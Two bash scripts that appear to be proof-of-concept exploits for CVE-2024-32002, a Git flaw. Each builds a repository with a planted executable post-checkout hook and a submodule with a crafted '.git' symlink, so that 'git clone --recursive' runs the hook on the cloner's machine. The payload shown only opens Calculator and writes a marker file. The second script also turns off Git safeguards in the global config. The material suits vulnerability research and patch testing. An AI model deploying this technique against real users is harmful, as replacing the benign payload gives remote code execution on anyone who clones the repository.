#!/bin/bash

##
## https://github.com/safebuffer/CVE-2024-32002
## https://github.com/JakobTheDev/cve-2024-32002-poc-aw
##

# Define repository paths
HULK_REPO="git@github.com:safebuffer/hulk.git"
pullme_REPO="git@github.com:safebuffer/submod.git"

# Final Exploit Repo
SMASH_REPO="git@github.com:safebuffer/smash.git"

# Function to clone and set up the hook repository
setup_HULK_REPO() {
	# Remove existing directories
	rm -rf hulk*

	git clone "$HULK_REPO" hulk

	# Navigate to the hook repository
	cd hulk/ || exit

	# Create necessary directories and set up the post-checkout hook
	mkdir -p y/hooks
	cp ./.git/hooks/post-update.sample y/hooks/post-checkout # so u won't get the hook ignored
	echo "/System/Applications/Calculator.app/Contents/MacOS/Calculator" > y/hooks/post-checkout

	# Add and commit the post-checkout hook
	git add y/hooks/post-checkout
	git update-index --chmod=+x y/hooks/post-checkout
	git commit -m "Add executable post-checkout hook"

	# Push changes to the remote repository
	git push

	# Return to the parent directory
	cd ..
}

# Function to clone and set up the pullme repository with a submodule
setup_pullme_repo() {
	# Remove existing directories
	rm -rf pullme*

	# Clone the pullme repository
	git clone "$pullme_REPO" pullme

	# Navigate to the pullme repository
	cd pullme || exit

	# Clean up previous directories and remove submodule
	rm -rf a* A*
	git rm -r A/modules/x

	# Add the hook repository as a submodule
	git submodule add --name x/y "$HULK_REPO" A/modules/x
	git commit -m "Add submodule"

	# Create a symlink to the .git directory
	# Print the string ".git" to a file named dotgit.txt
	printf .git > dotgit.txt

	# Generate a hash for the contents of dotgit.txt and store it in dot-git.hash
	# The `-w` option writes the object to the object database, and the hash is output
	git hash-object -w --stdin < dotgit.txt > dot-git.hash

	# Create an index info line for a symbolic link with the mode 120000
	# The line is formatted as: "120000 <hash> 0\ta"
	# 120000 indicates a symbolic link, <hash> is the content hash, and 'a' is the path in the index
	printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info

	# Update the git index with the information from index.info
	# This effectively stages the symbolic link for the next commit
	git update-index --index-info < index.info

	# Commit the staged changes with a message "Add symlink"
	git commit -m "Add symlink"
	# Push changes to the remote repository
	git push

	# Return to the parent directory
	cd ..
}

# Function to clone the smash repository with submodules
show_command() {
  # Define color codes
  RED='\033[0;31m'
  GREEN='\033[0;32m'
  YELLOW='\033[0;33m'
  BLUE='\033[0;34m'
  NC='\033[0m' # No Color

  # Output the command with colors
  echo -e "${GREEN}Trigger the exploit with ${NC}:\n"
  echo -e "${YELLOW}git clone --recursive ${BLUE}$SMASH_REPO ${RED}GITRCE${NC}"
}

# Execute functions
setup_HULK_REPO
setup_pullme_repo
show_command

###
###


#!/bin/bash

./clean.sh

# Enable detailed logging
LOGFILE="logfile.log"
function write_log {
    local message="$1"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo "$timestamp - $message" | tee -a $LOGFILE
}

write_log "Starting the script"

set -e

trap 'write_log "An error occurred. Exiting."' ERR

# Global configuration to allow file protocol and use symlinks
git config --global protocol.file.allow always
write_log "Configured protocol.file.allow to always"

git config --global core.symlinks true
write_log "Configured core.symlinks to true"

# Define the tell-tale path
TELL_TALE_PATH="/tmp/looooooooooooooooooool.txt"

# Initialize and configure the hook repository
git init hook
write_log "Initialized hook repository"

pushd hook
mkdir -p y/hooks

echo "#" > empty
git add empty
# echo "n" > empty
# git add empty
# echo "n" > hooks/empty
# git add hooks/empty
# git commit -m "add-empty"

write_log "Created directory hooks in hook repository"

# Create the y/hooks/post-checkout script
cat << 'EOF' > y/hooks/post-checkout
open -a Calculator.app
echo hook-run > /tmp/looooooooooooooooooool.txt
EOF

write_log "Created y/hooks/post-checkout script"
git add y/hooks/post-checkout
git update-index --chmod=+x y/hooks/post-checkout
chmod uoa+x y/hooks/post-checkout
git commit -m "y/hooks/post-checkout"
write_log "Committed y/hooks/post-checkout script in hook repository"
popd

HOOK_REPO_PATH="$(pwd)/hook"
write_log "Hook repository path: $HOOK_REPO_PATH"

# Initialize and configure the captain repository
git init captain
write_log "Initialized captain repository"

pushd captain




git submodule add --name x/y "$HOOK_REPO_PATH" A/modules/x
git commit -m "add-submodule"
ls A/modules/x | tee -a logfile.log

# read  -n 1 -p "wait 0:" mainmenuinput

#mkdir -p A/modules/x
# echo "n" > A/modules/x/empty
# git add A/modules/x/empty
# git commit -m "add-empty"

write_log "Added submodule and committed in captain repository"

printf ".git" > dotgit.txt
DOT_GIT_HASH=$(git hash-object -w dotgit.txt)
#echo "120000 $DOT_GIT_HASH 0	a" > index.info
printf "120000 %s 0\ta\n" "$DOT_GIT_HASH" > index.info
git update-index --index-info < index.info

# read  -n 1 -p "wait 1:" mainmenuinput

#git add dotgit.txt index.info
rm index.info
rm dotgit.txt

git commit -m "add-symlink"
write_log "Added symlink and committed in captain repository"


# mkdir -p A/modules/x
# echo "n" > A/modules/x/empty
# git add A/modules/x/empty
# git commit -m "add-empty"

popd

# Ensure the tell-tale path does not exist
if [ -f "$TELL_TALE_PATH" ]; then
    write_log "Error: tell-tale path should not exist"
    
else
    write_log "Tell-tale path does not exist as expected"
fi

# stop 2
#read  -n 1 -p "wait 2:" mainmenuinput


# Try cloning the repository
git clone --recursive captain hooked 2>&1 | tee git_recursive_clone.log

# Check error log for the expected message
if grep -q "directory not empty" err.log; then
    write_log "Error message 'directory not empty' found in err.log"
else
    write_log "Expected error message 'directory not empty' not found in err.log"
    
fi

# Ensure the tell-tale path does not exist after clone attempt
if [ -f "$TELL_TALE_PATH" ]; then
    write_log "Error: tell-tale path should not exist after clone"
    
else
    write_log "Tell-tale path does not exist after clone as expected"
fi

write_log "Script completed successfully"


ls -la hooked/ | tee -a logfile.log
git config --global core.symlinks | tee -a logfile.log

###
###
